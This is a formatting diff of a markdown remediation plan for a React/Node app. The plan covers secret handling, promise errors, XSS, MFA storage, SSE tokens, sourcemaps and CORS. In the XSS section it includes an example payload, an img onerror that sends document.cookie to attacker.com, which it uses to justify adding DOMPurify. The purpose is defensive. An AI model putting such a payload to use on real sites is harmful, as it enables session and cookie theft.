@@ -7,6 +7,7 @@
 **Status:** BLOCKING - Must do before any deployment
 
 **Current Problem:**
+
 ```
 .env contains:
 - DATABASE_URL with credentials
@@ -17,6 +18,7 @@
 ```
 
 **Step-by-step fix:**
+
 ```bash
 # 1. Backup current .env
 cp .env .env.backup
@@ -46,6 +48,7 @@ git commit -m "Add .env to gitignore"
 ```
 
 **After fix - .env.example should have:**
+
 ```
 # No real values, just placeholders
 DATABASE_URL="postgres://user:password@host:port/db"
@@ -60,10 +63,11 @@ JWT_SECRET="generate-a-random-secret-here"
 **Status:** CRITICAL - Causes app crashes
 
 **Example 1: AdminPanel.jsx**
+
 ```jsx
 // ❌ BEFORE (line ~1000-2000):
 useEffect(() => {
-  apiRequest("/api/admin/config").then(config => {
+  apiRequest("/api/admin/config").then((config) => {
     setConfig(config);
     // No error handler - if this fails, component breaks silently
   });
@@ -86,10 +90,11 @@ useEffect(() => {
 ```
 
 **Example 2: FloatingAssistant.jsx**
+
 ```jsx
 // ❌ BEFORE:
-messageQueue.forEach(msg => {
-  sendToAssistant(msg).then(response => {
+messageQueue.forEach((msg) => {
+  sendToAssistant(msg).then((response) => {
     updateUI(response);
   });
   // No catch - if API fails, queue gets stuck
@@ -106,10 +111,11 @@ const sendSafe = async (msg) => {
   }
 };
 
-messageQueue.forEach(msg => sendSafe(msg));
+messageQueue.forEach((msg) => sendSafe(msg));
 ```
 
 **Script to find all unhandled promises:**
+
 ```bash
 # Find all .then() calls:
 grep -n "\.then(" src/pages/AdminPanel.jsx | head -20
@@ -125,6 +131,7 @@ grep -B2 -A2 "\.then(" src/pages/AdminPanel.jsx | grep -v "\.catch"
 **Status:** HIGH - Users can inject malicious scripts
 
 **Current problem (25+ instances):**
+
 ```jsx
 // ❌ Vulnerable code in SearchResults.jsx (~line 300-1000):
 <div dangerouslySetInnerHTML={{ __html: result.description }} />
@@ -133,13 +140,18 @@ grep -B2 -A2 "\.then(" src/pages/AdminPanel.jsx | grep -v "\.catch"
 ```
 
 **If backend returns:**
+
 ```html
-<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
+<img
+  src="x"
+  onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)"
+/>
 ```
 
 **The user's cookies are stolen.**
 
 **Fix:**
+
 ```bash
 # Step 1: Install dompurify
 npm install dompurify
@@ -169,6 +181,7 @@ const sanitizeHtml = (html) => {
 ```
 
 **Complete replacement pattern:**
+
 ```bash
 # Find all in SearchResults.jsx:
 grep -n "dangerouslySetInnerHTML" src/pages/SearchResults.jsx
@@ -189,6 +202,7 @@ sed -i 's/__html: \([^}]*\)/__html: sanitizeHtml(\1)/g' src/pages/SearchResults.
 **Status:** HIGH - XSS can steal admin access
 
 **Current problem:**
+
 ```jsx
 // ❌ Line ~100-200:
 localStorage.setItem("admin_mfa_code", mfaCode);
@@ -200,6 +214,7 @@ const stolen = localStorage.getItem("admin_mfa_code");
 ```
 
 **Option 1: Use sessionStorage with TTL**
+
 ```jsx
 // ✅ Better (expires on browser close):
 sessionStorage.setItem("admin_mfa_code", mfaCode);
@@ -227,13 +242,14 @@ const code = getWithExpiry("admin_mfa_code");
 ```
 
 **Option 2: Use HTTP-Only Cookies (best)**
+
 ```js
 // Server-side (server/routes/adminRoutes.js):
 res.cookie("admin_verified", "true", {
-  httpOnly: true,      // Can't access from JS
-  secure: true,        // HTTPS only
-  sameSite: "strict",  // CSRF protection
-  maxAge: 30 * 60 * 1000 // 30 minutes
+  httpOnly: true, // Can't access from JS
+  secure: true, // HTTPS only
+  sameSite: "strict", // CSRF protection
+  maxAge: 30 * 60 * 1000, // 30 minutes
 });
 
 // Client won't need to store anything
@@ -249,6 +265,7 @@ res.cookie("admin_verified", "true", {
 **Status:** MEDIUM - Token visible in logs/history
 
 **Current problem:**
+
 ```jsx
 // ❌ Line 6:
 const url = `${BASE}/api/feed/stream?token=${encodeURIComponent(token)}`;
@@ -262,6 +279,7 @@ const source = new EventSource(url);
 ```
 
 **Fix 1: Use Authorization Header with interceptor**
+
 ```jsx
 // ✅ New approach - but EventSource doesn't support headers
 // So we need to use fetch instead:
@@ -276,28 +294,25 @@ export function subscribeFeedRealtime({
 
   const startStream = async () => {
     try {
-      const response = await fetch(
-        `${BASE}/api/feed/stream`,
-        {
-          headers: {
-            "Authorization": `Bearer ${token}`
-          }
-        }
-      );
+      const response = await fetch(`${BASE}/api/feed/stream`, {
+        headers: {
+          Authorization: `Bearer ${token}`,
+        },
+      });
 
       const reader = response.body.getReader();
       const decoder = new TextDecoder();
-      
+
       while (true) {
         const { done, value } = await reader.read();
         if (done) break;
-        
+
         const text = decoder.decode(value);
-        const lines = text.split('\n');
-        
-        lines.forEach(line => {
-          if (line.startsWith('event:')) {
-            const event = line.replace('event:', '').trim();
+        const lines = text.split("\n");
+
+        lines.forEach((line) => {
+          if (line.startsWith("event:")) {
+            const event = line.replace("event:", "").trim();
             // Handle SSE event
           }
         });
@@ -312,23 +327,24 @@ export function subscribeFeedRealtime({
 ```
 
 **Fix 2: Server-side validation**
+
 ```js
 // server/routes/feedRoutes.js:
-router.get('/stream', (req, res) => {
+router.get("/stream", (req, res) => {
   // ✅ Read token from header instead of query param:
-  const token = req.headers.authorization?.replace('Bearer ', '');
-  
+  const token = req.headers.authorization?.replace("Bearer ", "");
+
   if (!token) {
     return res.status(401).json({ error: "No token" });
   }
 
   // Verify token
   const user = verifyToken(token);
-  
+
   // Set up SSE
-  res.setHeader('Content-Type', 'text/event-stream');
-  res.setHeader('Cache-Control', 'no-cache');
-  
+  res.setHeader("Content-Type", "text/event-stream");
+  res.setHeader("Cache-Control", "no-cache");
+
   // Send events
 });
 ```
@@ -342,6 +358,7 @@ router.get('/stream', (req, res) => {
 **Status:** HIGH - 78 instances across 21 files
 
 **Quick script to find them all:**
+
 ```bash
 # Find all console statements:
 find src -name "*.jsx" -o -name "*.js" | xargs grep -l "console\."
@@ -354,6 +371,7 @@ done
 ```
 
 **Approach 1: Use development-only logging**
+
 ```jsx
 // ✅ Wrap in dev check:
 if (import.meta.env.DEV) {
@@ -364,6 +382,7 @@ if (import.meta.env.DEV) {
 ```
 
 **Approach 2: Use logger service**
+
 ```js
 // Create src/lib/logger.js:
 export const logger = {
@@ -375,7 +394,7 @@ export const logger = {
     if (import.meta.env.DEV) console.error(msg, err);
     // Send to error tracking service (Sentry, etc.)
     sendToErrorTracker({ message: msg, error: err });
-  }
+  },
 };
 
 // Usage in components:
@@ -385,6 +404,7 @@ logger.error("API failed", error);
 ```
 
 **Approach 3: Bulk find and remove**
+
 ```bash
 # Find in specific files:
 grep -n "console\." src/pages/AdminPanel.jsx
@@ -403,6 +423,7 @@ sed -i 's/console\./import.meta.env.DEV \&\& console./g' src/pages/AdminPanel.js
 **File:** `src/pages/OrgSettings.jsx`
 
 **Current:** No validation before submission
+
 ```jsx
 // ❌ Before:
 <input
@@ -414,6 +435,7 @@ sed -i 's/console\./import.meta.env.DEV \&\& console./g' src/pages/AdminPanel.js
 ```
 
 **✅ After: Add validation**
+
 ```jsx
 // Add validation helper:
 const validateOrgName = (name) => {
@@ -469,23 +491,25 @@ const handleSubmit = async () => {
 **File:** `vite.config.js`
 
 **Current problem:**
+
 ```js
 // ❌ Line 15:
-sourcemap: process.env.NODE_ENV !== "production"
+sourcemap: process.env.NODE_ENV !== "production";
 // This creates .js.map files for production builds
 // Exposes all source code to users
 ```
 
 **Fix:**
+
 ```js
 // ✅ Option 1: Never generate:
-sourcemap: false
+sourcemap: false;
 
 // ✅ Option 2: Only in development:
-sourcemap: import.meta.env.DEV
+sourcemap: import.meta.env.DEV;
 
 // ✅ Option 3: Only when explicitly enabled:
-sourcemap: process.env.GENERATE_SOURCEMAP === "true"
+sourcemap: process.env.GENERATE_SOURCEMAP === "true";
 ```
 
 ---
@@ -495,6 +519,7 @@ sourcemap: process.env.GENERATE_SOURCEMAP === "true"
 **File:** `server/server.js`
 
 **Current problem (line ~130):**
+
 ```js
 // ❌ Current:
 if (process.env.NODE_ENV === "production") {
@@ -507,6 +532,7 @@ if (process.env.NODE_ENV === "production") {
 ```
 
 **Fix:**
+
 ```js
 // ✅ Fixed:
 const corsOptions = {
@@ -568,21 +594,21 @@ npm run build && echo "✓ Build successful"
 
 ## Timeline to Production
 
-| Task | Effort | Priority | Blocker |
-|------|--------|----------|---------|
-| Remove secrets, rotate credentials | 2h | CRITICAL | YES |
-| Add promise error handlers | 6h | CRITICAL | YES |
-| Fix missing routes | 0.5h | CRITICAL | YES |
-| Sanitize XSS with DOMPurify | 2h | HIGH | YES |
-| Remove console statements | 2h | HIGH | NO |
-| Add input validation | 3h | HIGH | NO |
-| Fix admin credential storage | 1h | HIGH | NO |
-| Fix SSE token | 1h | HIGH | NO |
-| Disable sourcemaps | 0.25h | HIGH | NO |
-| Fix CORS | 0.5h | HIGH | NO |
-| Add error boundary | 1h | MEDIUM | NO |
-| Test thoroughly | 4h | ALL | NO |
-| **TOTAL** | **~23.25h** | - | - |
+| Task                               | Effort      | Priority | Blocker |
+| ---------------------------------- | ----------- | -------- | ------- |
+| Remove secrets, rotate credentials | 2h          | CRITICAL | YES     |
+| Add promise error handlers         | 6h          | CRITICAL | YES     |
+| Fix missing routes                 | 0.5h        | CRITICAL | YES     |
+| Sanitize XSS with DOMPurify        | 2h          | HIGH     | YES     |
+| Remove console statements          | 2h          | HIGH     | NO      |
+| Add input validation               | 3h          | HIGH     | NO      |
+| Fix admin credential storage       | 1h          | HIGH     | NO      |
+| Fix SSE token                      | 1h          | HIGH     | NO      |
+| Disable sourcemaps                 | 0.25h       | HIGH     | NO      |
+| Fix CORS                           | 0.5h        | HIGH     | NO      |
+| Add error boundary                 | 1h          | MEDIUM   | NO      |
+| Test thoroughly                    | 4h          | ALL      | NO      |
+| **TOTAL**                          | **~23.25h** | -        | -       |
 
 **Blocking fixes:** ~10.5 hours to production-ready
 **Full quality improvements:** ~23.25 hours
